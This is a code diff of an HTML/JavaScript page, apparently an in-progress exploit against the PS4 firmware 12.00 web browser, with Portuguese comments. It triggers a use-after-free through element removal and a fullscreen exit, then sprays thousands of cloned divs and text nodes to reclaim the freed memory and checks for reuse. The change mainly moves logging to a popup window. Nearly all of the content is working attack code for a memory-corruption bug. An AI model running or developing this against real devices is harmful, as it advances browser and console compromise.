@@ -2,22 +2,47 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Aggressive Reclaim (Targeted)</title>
+<title>PS4 12.00 - UAF Aggressive Reclaim (External Logger FIX)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Aggressive Reclaim (Targeted + Logger)</h2>
+<h2>PS4 12.00 - UAF Aggressive Reclaim (External Logger)</h2>
 <button onclick="runTest()">Run Test</button>
 
-<!-- Logger persistente -->
-<textarea id="logger" style="width:100%;height:250px;background:#000;color:#0f0;"></textarea>
-
 <script>
+let logWindow = null;
+
+// ==========================
+// LOGGER EXTERNO REAL (igual ao que funcionou)
+// ==========================
+function initLogger() {
+    logWindow = window.open("", "logger", "width=600,height=400");
+
+    if (logWindow) {
+        logWindow.document.open();
+        logWindow.document.write(`
+            <html>
+            <body style="background:black;color:lime;font-family:monospace;">
+            <h3>LOG OUTPUT</h3>
+            <pre id="log"></pre>
+            </body>
+            </html>
+        `);
+        logWindow.document.close();
+    }
+}
+
 function log(msg) {
     try { console.log(msg); } catch(e){}
-    const l = document.getElementById("logger");
-    l.value += msg + "\n";
-    l.scrollTop = l.scrollHeight;
+
+    try {
+        if (logWindow && !logWindow.closed) {
+            let el = logWindow.document.getElementById("log");
+            if (el) {
+                el.textContent += msg + "\\n";
+            }
+        }
+    } catch(e){}
 }
 
 // ==========================
@@ -60,21 +85,21 @@ function setupFullscreen() {
 }
 
 // ==========================
-// 💣 TARGETED RECLAIM (DIV CLONE)
+// 🎯 TARGETED RECLAIM (CORRETO)
 // ==========================
 function targetedReclaim() {
     log("[*] Targeted reclaim iniciado");
 
     let bucket = [];
 
-    // 🔥 Fase 1 — fragmentação leve
+    // Fragmentação leve
     for (let i = 0; i < 5000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
-    // 🔥 Fase 2 — CLONE DIRECIONADO (mesma estrutura do fsTarget)
+    // 🔥 CLONE DO fsTarget
     for (let i = 0; i < 20000; i++) {
         let el = document.createElement("div");
 
@@ -89,11 +114,10 @@ function targetedReclaim() {
         document.body.appendChild(el);
         bucket.push(el);
 
-        // 🔎 log parcial (igual seu teste antigo)
-        if (i < 50) log("REUSE_EL_" + i);
+        if (i < 40) log("REUSE_EL_" + i);
     }
 
-    // 🔥 Fase 3 — pressão extra
+    // Pressão adicional
     for (let i = 0; i < 10000; i++) {
         let txt = document.createTextNode("TXT_" + i);
         document.body.appendChild(txt);
@@ -105,7 +129,7 @@ function targetedReclaim() {
 }
 
 // ==========================
-// 🔬 DETECÇÃO REFORÇADA
+// 🔬 DETECÇÃO
 // ==========================
 function checkUAF(fsTarget) {
     log("---- CHECK UAF ----");
@@ -115,7 +139,7 @@ function checkUAF(fsTarget) {
         log("[CHECK] innerHTML = " + val);
 
         if (val && val.indexOf("REUSE_") !== -1) {
-            log("🔥🔥🔥 REUSE DETECTADO (innerHTML) 🔥🔥🔥");
+            log("🔥 REUSE DETECTADO (innerHTML)");
         }
 
     } catch(e) {
@@ -127,7 +151,7 @@ function checkUAF(fsTarget) {
         log("[CHECK] outerHTML = " + outer);
 
         if (outer && outer.indexOf("REUSE_") !== -1) {
-            log("🔥🔥🔥 REUSE DETECTADO (outerHTML) 🔥🔥🔥");
+            log("🔥 REUSE DETECTADO (outerHTML)");
         }
 
     } catch(e) {
@@ -139,7 +163,7 @@ function checkUAF(fsTarget) {
         log("[CHECK] textContent = " + txt);
 
         if (txt && txt.indexOf("REUSE_") !== -1) {
-            log("🔥🔥🔥 REUSE DETECTADO (textContent) 🔥🔥🔥");
+            log("🔥 REUSE DETECTADO (textContent)");
         }
 
     } catch(e) {
@@ -152,17 +176,10 @@ function checkUAF(fsTarget) {
     } catch(e) {
         log("[UAF] firstChild erro: " + e);
     }
-
-    try {
-        let attr = fsTarget.getAttribute("data-x");
-        log("[CHECK] data-x = " + attr);
-    } catch(e) {
-        log("[UAF] attribute erro: " + e);
-    }
 }
 
 // ==========================
-// TRIGGER (100% PRESERVADO)
+// TRIGGER (INALTERADO)
 // ==========================
 function trigger(fsTarget) {
     log("[*] Trigger: remove + exitFullscreen");
@@ -178,23 +195,21 @@ function trigger(fsTarget) {
         log("[ERRO] " + e);
     }
 
-    // 🔥 janela crítica — múltiplos targeted reclaim
+    // 🔥 janela crítica intacta
     setTimeout(() => targetedReclaim(), 0);
     setTimeout(() => targetedReclaim(), 50);
     setTimeout(() => targetedReclaim(), 100);
 
-    // 🔬 checagem
     setTimeout(() => checkUAF(fsTarget), 300);
 
-    // 🔁 comportamento original PRESERVADO
     setTimeout(() => location.reload(), 500);
 }
 
 // ==========================
-// MAIN (INALTERADO)
+// MAIN
 // ==========================
 function runTest() {
-    document.getElementById("logger").value = "";
+    initLogger(); // 🔥 ESSENCIAL
 
     log("[*] Iniciando teste");
 
@@ -204,7 +219,6 @@ function runTest() {
     window.onblur = function() {
         log("[*] onblur disparado");
 
-        // ⚠️ timing CRÍTICO preservado
         setTimeout(() => trigger(fsTarget), 3000);
     };
 }
